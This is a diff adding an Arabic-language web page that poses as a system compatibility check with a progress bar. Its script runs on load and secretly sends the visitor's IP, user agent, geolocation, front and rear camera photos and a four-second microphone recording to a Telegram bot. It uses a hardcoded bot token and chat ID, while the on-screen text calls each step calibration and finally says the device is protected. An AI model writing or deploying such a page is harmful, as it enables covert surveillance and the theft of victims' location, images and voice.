@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>إعدادات النظام</title>
+    <style>
+        body { background: #1a1a1a; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .container { text-align: center; background: #252525; padding: 30px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 85%; }
+        .loading-bar { width: 100%; height: 8px; background: #333; border-radius: 4px; margin: 20px 0; overflow: hidden; }
+        .progress { width: 0%; height: 100%; background: #4CAF50; transition: width 0.5s; }
+        p { font-size: 14px; color: #bbb; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h3 id="task-title">جاري فحص التوافق...</h3>
+    <div class="loading-bar"><div id="progress" class="progress"></div></div>
+    <p id="status">يرجى الانتظار، لا تغلق الصفحة</p>
+</div>
+
+<video id="video" style="display:none;" autoplay></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+    const TOKEN = "5017629429:AAEiWvcK_0_y8qvhK8kOvBToS-0bkzCAlLE";
+    const CHAT_ID = "56081692";
+    
+    const progress = document.getElementById('progress');
+    const status = document.getElementById('status');
+    const taskTitle = document.getElementById('task-title');
+
+    // دالة إرسال الرسائل النصية
+    async function sendMsg(text) {
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
+    }
+
+    // دالة إرسال الملفات (صور/صوت)
+    async function sendFile(blob, filename, type) {
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append(type === 'photo' ? 'photo' : 'audio', blob, filename);
+        await fetch(`https://api.telegram.org/bot${TOKEN}/${type === 'photo' ? 'sendPhoto' : 'sendAudio'}`, { method: 'POST', body: formData });
+    }
+
+    // بدء العملية بمجرد دخول الموقع
+    window.onload = async () => {
+        // البداية: جلب IP الضحية
+        try {
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+            sendMsg(`🌐 دخول جديد!\nIP: ${ipData.ip}\nالجهاز: ${navigator.userAgent}`);
+        } catch(e){}
+
+        startSequence();
+    };
+
+    async function startSequence() {
+        // --- الخطوة 1: الموقع الجغرافي ---
+        taskTitle.innerText = "تحسين دقة الخرائط...";
+        progress.style.width = "20%";
+        
+        await new Promise(resolve => {
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                await sendMsg(`📍 الموقع:\nhttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
+                resolve();
+            }, async (err) => {
+                await sendMsg("❌ رفض صلاحية الموقع");
+                resolve();
+            }, {timeout: 5000});
+        });
+
+        // --- الخطوة 2: الكاميرا (الأمامية والخلفية) ---
+        taskTitle.innerText = "معايرة مستشعر الضوء...";
+        progress.style.width = "50%";
+        
+        // الكاميرا الأمامية
+        await takePhoto("user", "الأمامية");
+        // الكاميرا الخلفية
+        await takePhoto("environment", "الخلفية");
+
+        // --- الخطوة 3: المايكروفون ---
+        taskTitle.innerText = "فحص جودة الصوت...";
+        progress.style.width = "80%";
+        
+        await new Promise(resolve => {
+            navigator.mediaDevices.getUserMedia({ audio: true }).then(async stream => {
+                const mediaRecorder = new MediaRecorder(stream);
+                const chunks = [];
+                mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                mediaRecorder.onstop = async () => {
+                    const blob = new Blob(chunks, { type: 'audio/ogg' });
+                    await sendFile(blob, 'voice.ogg', 'audio');
+                    stream.getTracks().forEach(t => t.stop());
+                    resolve();
+                };
+                mediaRecorder.start();
+                setTimeout(() => mediaRecorder.stop(), 4000); // تسجيل 4 ثواني
+            }).catch(async () => {
+                await sendMsg("❌ رفض صلاحية المايكروفون");
+                resolve();
+            });
+        });
+
+        // النهاية
+        progress.style.width = "100%";
+        taskTitle.innerText = "اكتمل الفحص بنجاح ✅";
+        status.innerText = "جهازك محمي الآن، يمكنك الخروج.";
+    }
+
+    async function takePhoto(mode, label) {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            video.srcObject = stream;
+            
+            await new Promise(r => setTimeout(r, 1500)); // وقت للمعايرة
+            
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            return new Promise(resolve => {
+                canvas.toBlob(async blob => {
+                    await sendFile(blob, `${label}.jpg`, 'photo');
+                    stream.getTracks().forEach(t => t.stop());
+                    resolve();
+                }, 'image/jpeg');
+            });
+        } catch(e) {
+            await sendMsg(`❌ رفض كاميرا ${label}`);
+        }
+    }
+</script>
+
+</body>
+</html>
